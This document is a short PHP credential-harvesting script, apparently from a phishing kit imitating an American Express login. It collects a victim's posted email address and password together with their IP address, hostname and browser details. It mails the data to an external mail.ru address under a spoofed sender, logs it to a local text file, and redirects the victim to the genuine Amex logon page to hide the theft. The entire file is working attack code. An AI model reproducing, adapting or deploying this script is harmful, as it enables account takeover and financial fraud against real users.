<?php
$ip = getenv("REMOTE_ADDR");$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$message  = "========+[ Email Login ]+=========\n";
$message .= "Email : ".$_POST['userid']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "HostName : ".$hostname."\n";

$message .= "Date And Time : ".$date."\n";

$message .= "Browser Details : ".$user_agent."\n";
$send = "gerasimovaveroniya6419@mail.ru";
$subject = "Email Address | $ip";
$headers = "From: NT1Ks0l  <legit@mrmoz.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
$fp = fopen("./Email.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location: https://online.americanexpress.com/myca/logon/us/action/LogonHandler?request_type=LogonHandler&Face=en_US&inav=iNavLnkLog");
?>
